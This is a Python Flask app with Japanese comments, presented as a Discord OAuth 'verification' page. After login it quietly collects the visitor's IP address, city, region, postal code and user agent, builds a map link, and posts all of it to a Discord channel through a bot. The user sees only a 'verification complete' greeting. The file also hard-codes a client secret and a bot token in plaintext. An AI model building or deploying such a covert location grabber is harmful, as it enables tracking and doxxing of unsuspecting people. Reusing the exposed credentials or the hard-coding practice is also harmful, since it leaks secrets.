import os
import requests
from flask import Flask, request, redirect, render_template
from datetime import datetime
import pytz
import urllib.parse
import asyncio
import discord

app = Flask(__name__)
app.secret_key = os.urandom(24)

DISCORD_CLIENT_ID = "1366806821456838727"
DISCORD_CLIENT_SECRET = "4nsa1A8noxdUX_D54GYG0VXL4cCZJ1dX"
REDIRECT_URI = "https://verify-tr0-4.onrender.com/callback"

# Botトークンと送信先チャンネルIDを指定
DISCORD_BOT_TOKEN = "MTM2NjgwNjgyMTQ1NjgzODcyNw.G_ovuw.AJtnwlfvR5AURrWaXDNvFz1hAnMyH62NuDhCo0"
DISCORD_CHANNEL_ID = 1366804810464235713  # ←ここを送信したいチャンネルIDに置き換える

# Botの初期化
intents = discord.Intents.default()
bot = discord.Client(intents=intents)

def get_location(ip):
    try:
        res = requests.get(f"https://ipapi.co/{ip}/json/").json()
        return {
            "ip": ip,
            "city": res.get("city", "不明"),
            "region": res.get("region", "不明"),
            "postal": res.get("postal", "不明"),
            "country": res.get("country_name", "不明"),
        }
    except:
        return {"ip": ip, "city": "不明", "region": "不明", "postal": "不明", "country": "不明"}

@app.route('/')
def index():
    return render_template("login.html")

@app.route('/login')
def login():
    params = {
        "client_id": DISCORD_CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": "identify"
    }
    return redirect(f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}")

@app.route('/callback')
def callback():
    code = request.args.get("code")
    if not code:
        return "Code not found", 400

    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    token_response = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)

    try:
        token_json = token_response.json()
    except Exception:
        return f"[!] DiscordトークンレスポンスがJSONではありません: {token_response.text}", 400

    access_token = token_json.get("access_token")
    if not access_token:
        return f"[!] アクセストークンが見つかりません。\nDiscordレスポンス: {token_json}", 400

    user_res = requests.get(
        "https://discord.com/api/users/@me",
        headers={"Authorization": f"Bearer {access_token}"}
    )
    user = user_res.json()
    username = f"{user['username']}#{user['discriminator']}"
    user_id = int(user['id'])

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    location = get_location(ip)

    jst = pytz.timezone('Asia/Tokyo')
    now = datetime.now(jst).strftime("%Y-%m-%d %H:%M:%S")

    message_content = (
        f"📥 新しいアクセス\n"
        f"🕒 時間: {now}\n"
        f"👤 ユーザー: {username} (`{user_id}`)\n"
        f"🌍 IP: {location['ip']}\n"
        f"📍 地域: {location['region']}（{location['city']}）\n"
        f"〒 郵便番号: {location['postal']}\n"
        f"🗺️ マップ: https://www.google.com/maps?q={location['ip']}\n"
        f"🧭 国: {location['country']}\n"
        f"🖥️ UA: {request.headers.get('User-Agent')}\n"
        f"Ultra Cyber Auth System"
    )

    async def send_to_channel():
        try:
            channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
            if channel:
                await channel.send(message_content)
        except Exception as e:
            print(f"チャンネル送信でエラー: {e}")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_to_channel())
    loop.close()

    return f"ようこそ、{username} さん！ 認証が完了しました。"

if __name__ == "__main__":
    import threading

    def run_flask():
        port = int(os.environ.get("PORT", 5000))
        app.run(host="0.0.0.0", port=port)

    def run_bot():
        bot.run(DISCORD_BOT_TOKEN)

    threading.Thread(target=run_flask).start()
    run_bot()
